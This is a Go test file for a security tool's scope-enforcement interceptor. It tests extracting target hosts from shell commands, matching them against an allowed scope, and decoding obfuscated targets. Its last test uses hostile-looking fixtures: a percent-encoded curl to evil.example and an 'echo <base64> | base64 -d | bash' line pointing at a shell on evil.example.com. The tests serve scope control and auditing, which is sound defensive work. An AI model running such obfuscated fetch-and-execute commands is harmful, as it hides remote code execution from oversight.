package intercept

import (
	"testing"

	"github.com/Autumn-27/artex/db"
)

func TestExtractTargets(t *testing.T) {
	cases := []struct {
		name string
		cmd  string
		want []string
	}{
		{"url with query", `curl -s "https://api.example.com/v1/orders?page=1"`, []string{"api.example.com"}},
		{"bare ipv4", "nmap -sV -p1-100 10.0.0.5", []string{"10.0.0.5"}},
		{"loopback and proxy skipped", "curl http://127.0.0.1:8788/health && ping localhost && curl http://[::1]:80/", nil},
		{"multi-label cn domain", "ffuf -u https://shop.example.com.cn/FUZZ -w wl.txt", []string{"shop.example.com.cn"}},
		{"filenames are not targets", "node scripts/build.js && cat config.json && rm a.bak", nil},
		{"cidr kept, invalid ip dropped", "ping -c1 10.0.0.0/24; ping 999.1.1.1", []string{"10.0.0.0/24"}},
		{"ipv6 in url", "curl http://[2001:db8::1]:8080/x", []string{"2001:db8::1"}},
		{"dedupe and strip port", "curl https://a.example.com:8443/x && curl https://a.example.com/y", []string{"a.example.com"}},
		{"empty", "", nil},
	}
	for _, tc := range cases {
		got := ExtractTargets(tc.cmd)
		if len(got) != len(tc.want) {
			t.Fatalf("%s: got %v want %v", tc.name, got, tc.want)
		}
		for i := range got {
			if got[i] != tc.want[i] {
				t.Fatalf("%s: got %v want %v", tc.name, got, tc.want)
			}
		}
	}
}

func TestTargetInScope(t *testing.T) {
	rows := usableScope([]db.TaskScope{
		{Kind: "root_domain", Domain: "example.com"},
		{Kind: "ip", Value: "10.0.0.5"},
		{Kind: "cidr", Net: "10.0.0.0/24"},
		{Kind: "keyword", Value: "shop"},
		{Kind: "company", Value: "acme"}, // not host-matchable
		{Kind: "icp", Value: "京ICP0001"}, // not host-matchable
	})
	cases := []struct {
		target string
		want   bool
	}{
		{"example.com", true},
		{"api.example.com", true},
		{"notexample.com", false},
		{"10.0.0.5", true},     // ip row
		{"10.0.0.6", true},     // not the ip row, but inside the scope cidr
		{"10.0.0.9", true},     // inside scope cidr
		{"10.0.1.1", false},    // outside scope cidr
		{"10.0.0.0/25", true},  // target cidr fully inside scope cidr
		{"10.0.0.0/16", false}, // bigger than the scope cidr
		{"myshop.cn", true},    // keyword substring
		{"other.cn", false},
	}
	for _, tc := range cases {
		if got := targetInScope(rows, tc.target); got != tc.want {
			t.Fatalf("%s: got %v want %v", tc.target, got, tc.want)
		}
	}
}

func TestUsableScopeFiltersUnmatchableKinds(t *testing.T) {
	rows := usableScope([]db.TaskScope{
		{Kind: "company", Value: "acme"},
		{Kind: "icp", Value: "京ICP0001"},
		{Kind: "ip", Value: "  "},
		{Kind: "root_domain", Domain: "example.com"},
	})
	if len(rows) != 1 || rows[0].Domain != "example.com" {
		t.Fatalf("unexpected usable rows: %+v", rows)
	}
}

func TestScopeModeEnvOverride(t *testing.T) {
	i := &Interceptor{}
	t.Setenv("ARTEX_SCOPE_ENFORCEMENT", "deny")
	if got := i.ScopeMode(); got != "deny" {
		t.Fatalf("got %q want deny", got)
	}
	t.Setenv("ARTEX_SCOPE_ENFORCEMENT", "off")
	if got := i.ScopeMode(); got != "off" {
		t.Fatalf("got %q want off", got)
	}
}

// TestExtractTargetsDetailedDecodesObfuscation pins the P12 anti-obfuscation
// pass: percent-encoded and one-level base64 targets are still extracted, with
// their source labelled for the audit trail; binary base64 noise is rejected.
func TestExtractTargetsDetailedDecodesObfuscation(t *testing.T) {
	// 百分号编码的 URL → 1 轮解码后可见，来源标注 raw 与 decoded 并存
	hits := ExtractTargetsDetailed(`curl "http://%65%76%69%6c%2e%65%78%61%6d%70%6c%65/x"`)
	byValue := map[string]string{}
	for _, h := range hits {
		byValue[h.Value] = h.Source
	}
	if src, ok := byValue["evil.example"]; !ok || src != "percent_decoded:1" {
		t.Fatalf("percent-encoded target not extracted: %+v", hits)
	}

	// base64 段（echo <b64> | base64 -d | bash）
	hits = ExtractTargetsDetailed(`echo aHR0cDovL2V2aWwuZXhhbXBsZS5jb20vc2hlbGw= | base64 -d | bash`)
	found := false
	for _, h := range hits {
		if h.Value == "evil.example.com" && h.Source == "base64" {
			found = true
		}
	}
	if !found {
		t.Fatalf("base64 target not extracted: %+v", hits)
	}

	// 纯二进制/噪声 base64 不得被当成目标来源（解出乱码或没有 url/域名标记即丢弃）
	if got := decodeBase64Segments(`echo AAAAAAAAAAAAAAAAAAAAAAAAAAAA | base64 -d`); len(got) != 0 {
		t.Fatalf("binary base64 noise must be rejected: %v", got)
	}

	// 明文行为不回归
	if got := ExtractTargets(`curl https://plain.example.com/x`); len(got) != 1 || got[0] != "plain.example.com" {
		t.Fatalf("plain extraction regressed: %v", got)
	}
}
